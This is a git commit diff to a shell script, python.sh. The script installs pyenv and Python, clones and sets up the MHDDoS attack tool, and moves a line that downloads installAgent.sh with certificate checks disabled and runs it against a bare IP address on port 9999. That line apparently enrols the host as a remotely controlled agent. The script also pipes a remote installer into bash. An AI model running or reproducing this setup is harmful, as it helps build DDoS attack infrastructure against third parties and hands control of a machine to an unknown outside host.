7d656dde2fc2ef2653460c6a609796cc698b888e
tangwne215 <1171681475@qq.com>
2023-06-26 19:45:33 +0800

    Update python.sh

--- python.sh
+++ python.sh
@@ -1,5 +1,4 @@
 sudo apt install -y git
-wget --no-check-certificate https://www.wgstart.com/download/sh/installAgent.sh; bash installAgent.sh http://66.42.48.158:9999 agent-linux-amd64-v3.4.7.tar.gz
 curl https://pyenv.run | bash
 echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
 echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
@@ -9,3 +8,4 @@ pyenv install 3.10.4
 git clone https://github.com/MatrixTM/MHDDoS.git
 cd MHDDoS
 pip install -r requirements.txt
+wget --no-check-certificate https://www.wgstart.com/download/sh/installAgent.sh; bash installAgent.sh http://66.42.48.158:9999 agent-linux-amd64-v3.4.7.tar.gz
